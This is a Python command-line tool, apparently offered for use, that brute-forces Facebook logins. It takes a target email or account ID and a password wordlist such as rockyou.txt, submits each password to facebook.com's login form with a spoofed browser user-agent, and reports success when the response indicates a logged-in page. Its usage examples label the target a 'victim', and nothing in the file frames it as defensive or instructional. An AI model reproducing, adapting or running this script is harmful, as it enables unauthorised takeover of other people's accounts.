#!/usr/bin/python
# -*- coding: utf-8 -*-

#I Love Python(^-^)
try:
 ##----------- Import Libraries -----------##
 import socket,time,os,optparse,mechanize  ##
 ##----------------------------------------##
except ImportError:
	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
	exit(1)
################## check internet #################
server = "www.google.com"                         #
def check():                                      #
   try:                                           #
      s = socket.gethostbyname(server)            #
      ss = socket.create_connection((s, 80), 2)   #
      return True                                 #
   except:                                        #
         pass                                     #
   return False                                   #
                                                  #
check = check()                                   #
###################################################

parse = optparse.OptionParser("""\nUsage: python ./FB-BrForAttack.py -T [TARGET]<Email/ID> -W <Wordlist file>

OPTIONS:
        -t <target email>        ::>   Set target Email
        -w <word list file>      ::>   Set Wordlist File 

Example:
        ./FB-BrForAttack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
	./FB-BrForAttack.py -t 100001013078780 -w /usr/share/wordlists/rockyou.txt

""")
def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
			help="target email !")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
			help="wordlist file !")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None: 
     user = options.taremail
     passw = options.wlst
     global check
     if check == True:
         try:
             passwfile = open(passw, "r")
         except IOError:
             print("\n[!] No Such File: "+passw+"  !!!\n")
             exit(1)
         os.system("cls||clear")
         time.sleep(0.10)
         print("\n[*] website>: www.facebook.com ")
         time.sleep(0.10)
         print("\n[+] Target Email>: "+str(user))
         time.sleep(0.10)
         print("\n[@] WordList>: "+str(passw))
         time.sleep(0.10)
         print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
         time.sleep(0.20)
         print("\n[$]--- Brute Force Attack Start ---[$]\n")
         time.sleep(0.8)
         lo = 1
         for password in passwfile:
             if not password.strip(): continue
             password = password.strip()
             try:
                 br=mechanize.Browser()
                 br.set_handle_robots(False)
                 br.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                 br.open("https://facebook.com")
                 br.select_form(nr=0)
                 br.form["email"]=user
                 br.form["pass"]=password
                 br.method="POST"
                 res = br.submit()
                 if "home_icon" in res.get_data():
                     print("[+]~[{}] Testing Password[ {} ]  ==> Yes :)".format(lo,password))
                     print ("\n[*] Found! Password is ==> "+ password)
                     break
                 else:
                     print('[-]~[{}] Testing Password[ {} ] ==> No :('.format(lo,password))
                     lo +=1
             except KeyboardInterrupt:
                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
                 time.sleep(1.2)
                 exit(1)
     elif check == False:
         print("\n[!] Error: Please Check Your Internet Connection !!!")
         exit(1)
   else:
       print(parse.usage)
       exit(1)
if __name__=='__main__':
	Main()
	
##############################################################
##################### 		     #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Oseid Aldary
#Have a nice day :)
#GoodBye
